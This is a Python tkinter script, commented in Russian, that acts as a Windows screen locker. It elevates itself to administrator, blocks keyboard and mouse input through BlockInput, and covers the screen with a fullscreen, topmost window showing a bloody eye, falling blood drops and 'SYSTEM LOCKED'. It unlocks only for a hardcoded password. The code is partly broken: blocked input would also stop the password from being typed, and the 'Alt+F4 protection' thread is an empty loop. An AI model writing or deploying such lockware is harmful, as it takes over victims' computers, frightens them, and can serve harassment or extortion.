import tkinter as tk
from tkinter import messagebox
import ctypes
import sys
import random
import threading
import time

# Права админа
if not ctypes.windll.shell32.IsUserAnAdmin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

# Блокировка клавиш
ctypes.windll.user32.BlockInput(True)

# Окно
root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.configure(bg='black')
root.overrideredirect(True)

# Пароль
PASSWORD = "Lolas541"

# Размеры экрана
w = root.winfo_screenwidth()
h = root.winfo_screenheight()
cx, cy = w//2, h//3

# Холст
canvas = tk.Canvas(root, bg='black', highlightthickness=0)
canvas.pack(fill=tk.BOTH, expand=True)

# Кровавый глаз
canvas.create_oval(cx-150, cy-150, cx+150, cy+150, fill='#8b0000', outline='#ff0000', width=5)
canvas.create_oval(cx-50, cy-50, cx+50, cy+50, fill='black', outline='#ff3333', width=3)
canvas.create_oval(cx-20, cy-80, cx+20, cy-40, fill='white', outline='white')

# Капли крови
drops = []
for i in range(30):
    x = random.randint(30, 200) if i < 15 else random.randint(w-200, w-30)
    y = random.randint(-500, h)
    drop = canvas.create_oval(x, y, x+20, y+40, fill='#ff0000', outline='#8b0000')
    drops.append({'id': drop, 'speed': random.uniform(3, 8), 'x': x})

def animate():
    for drop in drops:
        coords = canvas.coords(drop['id'])
        if coords and coords[1] < h + 100:
            canvas.move(drop['id'], 0, drop['speed'])
        else:
            canvas.coords(drop['id'], drop['x'], -100, drop['x']+20, -60)
    root.after(40, animate)

animate()

# Интерфейс
canvas.create_text(cx, cy+120, text="⚠️ СИСТЕМА ЗАБЛОКИРОВАНА ⚠️", fill='#ff0000', font=('Arial', 32, 'bold'))
entry = tk.Entry(root, show='*', font=('Arial', 24), bg='black', fg='red', insertbackground='red', width=20)
entry.place(x=cx-150, y=cy+200, width=300, height=50)
entry.focus()

def check():
    if entry.get() == PASSWORD:
        ctypes.windll.user32.BlockInput(False)
        root.quit()
        sys.exit()
    else:
        messagebox.showerror("Ошибка", "Неверный пароль!")
        entry.delete(0, 'end')

btn = tk.Button(root, text="РАЗБЛОКИРОВАТЬ", command=check, font=('Arial', 18), bg='#8b0000', fg='white')
btn.place(x=cx-100, y=cy+270, width=200, height=50)
root.bind('<Return>', lambda e: check())

# Защита от Alt+F4
def block_keys():
    while True:
        time.sleep(0.1)

threading.Thread(target=block_keys, daemon=True).start()
root.mainloop()